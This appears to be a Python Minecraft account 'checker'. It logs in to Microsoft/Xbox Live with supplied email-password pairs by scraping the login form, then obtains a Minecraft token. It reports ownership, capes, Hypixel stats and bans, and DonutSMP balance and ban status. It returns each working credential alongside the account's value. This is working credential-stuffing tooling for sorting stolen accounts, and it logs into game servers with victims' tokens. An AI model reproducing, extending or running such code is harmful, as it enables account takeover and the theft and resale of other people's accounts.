import requests
import re
import uuid
import json
import time
import socket
import socks
import random
from urllib.parse import urlparse, parse_qs
from datetime import datetime, timezone
import warnings
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings()
warnings.filterwarnings("ignore")

from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound

class MaceChecker:
    def __init__(self):
        self.sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
        self.proxies = []

    def get_proxy(self):
        return None

    def get_urlPost_sFTTag(self, session):
        try:
            text = session.get(self.sFTTag_url, timeout=15, verify=False).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag
        except Exception:
            pass
        return None, None

    def get_xbox_rps(self, session, email, password, urlPost, sFTTag):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=20, verify=False)
            
            if '#' in login_request.url and login_request.url != self.sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, None
            elif 'cancel?mkt=' in login_request.text:
                return None, "Login Cancelled/Intersected"
            
            if any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return "2FA", "2FA Required"
            
            if "Sign in to" in login_request.text or "Enter password" in login_request.text:
                 return None, "Invalid Credentials"

            return None, "Unknown Login Response"
        except Exception as e:
            return None, f"Login Request Error: {str(e)}"

    def mc_token(self, session, uhs, xsts_token):
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15, verify=False)
            if mc_login.status_code == 200:
                return mc_login.json().get('access_token')
        except:
            pass
        return None

    def check_ownership(self, session, token):
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {token}'}, verify=False)
            if checkrq.status_code == 200:
                items = checkrq.json().get("items", [])
                has_normal = False
                has_gp_pc = False
                has_gp_ult = False
                
                for item in items:
                    name = item.get("name", "")
                    source = item.get("source", "")
                    if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
                        has_normal = True
                    if name == "product_game_pass_pc":
                        has_gp_pc = True
                    if name == "product_game_pass_ultimate":
                        has_gp_ult = True
                
                if has_normal and has_gp_pc: return "Normal Minecraft (with Game Pass)"
                if has_normal and has_gp_ult: return "Normal Minecraft (with Game Pass Ultimate)"
                if has_normal: return "Normal Minecraft"
                if has_gp_ult: return "Xbox Game Pass Ultimate"
                if has_gp_pc: return "Xbox Game Pass (PC)"
                
                others = []
                if 'product_minecraft_bedrock' in checkrq.text: others.append("Minecraft Bedrock")
                if 'product_legends' in checkrq.text: others.append("Minecraft Legends")
                if 'product_dungeons' in checkrq.text: others.append('Minecraft Dungeons')
                if others: return f"Other ({', '.join(others)})"
                
                return "No Minecraft Product"
        except:
            pass
        return "Error Checking Ownership"

    def get_profile(self, session, token):
        try:
            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False)
            if r.status_code == 200:
                data = r.json()
                return data['id'], data['name'], data.get('capes', [])
        except:
            pass
        return None, None, []

    def check_hypixel_stats(self, username):
        stats = {}
        try:
            headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}
            tx = requests.get(f'https://plancke.io/hypixel/player/stats/{username}', headers=headers, verify=False).text
            
            try: stats['level'] = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
            except: pass
            try: stats['first_login'] = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
            except: pass
            try: stats['last_login'] = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
            except: pass
            try: stats['bw_stars'] = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
            except: pass
            try: stats['rank'] = re.search(r'<b>Rank:</b>\s*([^<]+)', tx).group(1).strip()
            except: pass
            try: stats['karma'] = re.search(r'<b>Karma:</b>\s*([^<]+)', tx).group(1).strip()
            except: pass
        except:
            pass
        
        try:
            req = requests.get(f"https://sky.shiiyu.moe/stats/{username}", verify=False)
            stats['sb_coins'] = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
        except: pass
        
        return stats

    def check_hypixel_ban(self, username, token, uuid_str):
        try:
            auth_token = AuthenticationToken(username=username, access_token=token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=uuid_str, name=username)
            connection = Connection("hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
            
            ban_status = {"status": "Clean", "reason": None}
            
            def handle_disconnect(packet):
                data = json.loads(str(packet.json_data))
                if "Suspicious activity" in str(data):
                     ban_status["status"] = "Banned"
                     ban_status["reason"] = f"Suspicious activity. Ban ID: {data['extra'][6]['text'].strip()}"
                elif "temporarily banned" in str(data):
                    ban_status["status"] = "Banned"
                    ban_status["reason"] = f"{data['extra'][4]['text'].strip()}"
                elif "permanently banned" in str(data):
                    ban_status["status"] = "Banned"
                    ban_status["reason"] = f"{data['extra'][2]['text'].strip()}"
                else:
                    ban_status["status"] = "Banned"
                    ban_status["reason"] = "Unknown Ban Reason"

            connection.register_packet_listener(handle_disconnect, clientbound.login.DisconnectPacket)
            
            try:
                connection.connect()
                time.sleep(1.5)
                connection.disconnect()
            except:
                pass
                
            return ban_status
        except:
            return {"status": "Error", "reason": "Connection Failed"}

    def check_donutsmp_status(self, username, token, uuid_str):
        status = {"status": "Unknown", "money": None, "playtime": None, "shards": None, "rank": None, "reason": None}
        
        auth_token = AuthenticationToken(username=username, access_token=token, client_token=uuid.uuid4().hex)
        auth_token.profile = Profile(id_=uuid_str, name=username)
        
        try:
            connection = Connection("donutsmp.net", 25565, auth_token=auth_token, initial_version=393, allowed_versions={393})
             
            def handle_join(packet):
                status["status"] = "Unbanned"
            
            def handle_disconnect(packet):
                status["status"] = "Banned"
                try:
                    msg = str(packet.json_data)
                    reason_match = re.search(r'\[([^\]]+)\]', msg)
                    status["reason"] = reason_match.group(1).strip() if reason_match else "Banned"
                except: pass

            def handle_chat(packet):
                 try:
                    msg = str(packet.json_data)
                    clean = re.sub(r'§.', '', msg)
                    
                    m = re.search(r'(?:Money|Balance|Coins?):\s*\$?([0-9,]+)', clean, re.IGNORECASE)
                    if m: status["money"] = f"${m.group(1)}"
                    
                    p = re.search(r'(?:Playtime|Time Played|Play Time):\s*([^\n\\,]+)', clean, re.IGNORECASE)
                    if p: status["playtime"] = p.group(1).strip()
                    
                    s = re.search(r'(?:Donut )?Shards?:\s*([0-9,]+)', clean, re.IGNORECASE)
                    if s: status["shards"] = s.group(1)
                    
                    l = re.search(r'Level:\s*([0-9,]+)', clean, re.IGNORECASE)
                    if l: status["level"] = l.group(1)
                    
                    r_match = re.search(r'Rank:\s*([^\n\\,]+)', clean, re.IGNORECASE)
                    if r_match: status["rank"] = r_match.group(1).strip()
                    
                    k = re.search(r'Kills?:\s*([0-9,]+)', clean, re.IGNORECASE)
                    if k: status["kills"] = k.group(1)
                    
                    d = re.search(r'Deaths?:\s*([0-9,]+)', clean, re.IGNORECASE)
                    if d: status["deaths"] = d.group(1)
                    
                 except: pass

            connection.register_packet_listener(handle_join, clientbound.play.JoinGamePacket)
            connection.register_packet_listener(handle_disconnect, clientbound.login.DisconnectPacket)
            connection.register_packet_listener(handle_chat, clientbound.play.ChatMessagePacket)
            
            connection.connect()
            time.sleep(4)
            connection.disconnect()
            
        except:
            pass
            
        return status

    def check_account(self, email, password):
        session = requests.Session()
        session.verify = False
        
        retries = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504],
            allowed_methods={"HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"}
        )
        adapter = HTTPAdapter(max_retries=retries)
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        
        urlPost, sFTTag = None, None
        for _ in range(3):
            urlPost, sFTTag = self.get_urlPost_sFTTag(session)
            if urlPost and sFTTag: break
            time.sleep(1)

        if not urlPost or not sFTTag:
            return {"success": False, "message": "Failed to get Login URL (Connection/Rate Limit)"}

        token, error_msg = self.get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if token == "2FA":
             return {"success": False, "message": "2FA / Email Verification Required"}
        if not token:
             return {"success": False, "message": error_msg or "Invalid Credentials"}
             
        try:
            xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', 
                json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, 
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15, verify=False)
            
            xbox_token = xbox_login.json().get('Token')
            uhs = xbox_login.json()['DisplayClaims']['xui'][0]['uhs']
            
            xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', 
                json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, 
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15, verify=False)
            
            xsts_token = xsts.json().get('Token')
            mc_token = self.mc_token(session, uhs, xsts_token)
            
            if not mc_token:
                return {"success": False, "message": "Failed to get Minecraft Token"}
                
            ownership = self.check_ownership(session, mc_token)
            uuid_str, username, capes = self.get_profile(session, mc_token)
            
            if not username:
                return {"success": True, "email": email, "password": password, "type": ownership, "username": "N/A"}
                
            hypixel_stats = self.check_hypixel_stats(username)
            hypixel_ban = self.check_hypixel_ban(username, mc_token, uuid_str)
            donut_status = self.check_donutsmp_status(username, mc_token, uuid_str)
            
            result = {
                "success": True,
                "email": email,
                "password": password,
                "username": username,
                "uuid": uuid_str,
                "type": ownership,
                "capes": [c['alias'] for c in capes],
                "hypixel": hypixel_stats,
                "hypixel_ban": hypixel_ban,
                "donut": donut_status
            }
            return result
            
        except Exception as e:
            return {"success": False, "message": f"Error during checks: {str(e)}"}
